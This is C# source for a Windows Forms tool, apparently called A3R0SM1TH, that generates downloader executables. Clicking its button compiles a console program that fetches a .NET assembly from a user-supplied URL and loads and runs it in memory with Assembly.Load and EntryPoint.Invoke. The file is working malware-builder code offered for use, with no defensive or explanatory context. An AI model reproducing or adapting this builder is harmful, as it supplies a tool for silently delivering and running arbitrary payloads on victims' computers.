﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Web;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Reflection;
using System.CodeDom.Compiler;
using Microsoft.CSharp;

namespace A3R0SM1TH
{
	public partial class A3R0SM1THform : Form
	{
		public A3R0SM1THform()
		{
			InitializeComponent();
			this.FormBorderStyle = FormBorderStyle.FixedSingle;
		}

		private void A3R0SM1THform_Paint(object sender, PaintEventArgs e)
		{
			// Was gonna paint something but nvm...
		}

		private void A3R0SM1THform_Load(object sender, EventArgs e)
		{
			// Oops...
		}

		private void generateButton_Click(object sender, EventArgs e)
		{
			String url = fileLinkBox.Text;
			String text = @"using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
	class Program
	{
		static void Main(string[] args)
		{
			Download().GetAwaiter().GetResult();
		}

		static async Task Download()
		{
			using (var httpClient = new HttpClient())
			{
				using (var request = new HttpRequestMessage(HttpMethod.Get, ";
			String text2 = @"))
				{
					using (Stream contentStream = await(await httpClient.SendAsync(request)).Content.ReadAsStreamAsync())
					{
						MemoryStream memoryStream = new MemoryStream();
						await contentStream.CopyToAsync(memoryStream);
						byte[] bin = memoryStream.ToArray();
						memoryStream.Close();

						Assembly a = Assembly.Load(bin);
						MethodInfo method = a.EntryPoint;
						if (method != null)
						{
							string[] meme = new string[] { null };
							object o = a.CreateInstance(method.Name);
							method.Invoke(o, meme);
						}
					}
				}
			}
		}
	}
}

";
			saveDownloader.Filter = "exe files (*.exe)|.exe";
			saveDownloader.Title = "Save the .exe File";
			saveDownloader.ShowDialog();
			String fileDownName = saveDownloader.FileName;
			System.IO.File.WriteAllText("test.cs", text + "\"" + url + "\"" + text2);

			CSharpCodeProvider codeProvider = new CSharpCodeProvider();
			ICodeCompiler icc = codeProvider.CreateCompiler();

			System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
			parameters.ReferencedAssemblies.Add("System.Net.dll");
			parameters.ReferencedAssemblies.Add("System.Linq.dll");
			parameters.ReferencedAssemblies.Add("System.Net.Http.dll");
			parameters.ReferencedAssemblies.Add("System.dll");

			//Make sure we generate an EXE, not a DLL
			parameters.GenerateExecutable = true;
			parameters.OutputAssembly = fileDownName;
			CompilerResults results = icc.CompileAssemblyFromSource(parameters, text + "\"" + url + "\"" + text2);
			if (results.Errors.Count > 0)
			{
				// Display compilation errors.
				errorLabel.Text += "Errors building file into " + results.PathToAssembly + "\n";
				foreach (CompilerError ce in results.Errors)
				{
					errorLabel.Text += ce.ToString() + "\n";
				}
			}
			else
			{
				// Display a successful compilation message.
				errorLabel.Text = "File built into " + results.PathToAssembly + " successfully.";
			}
		}
	}
}

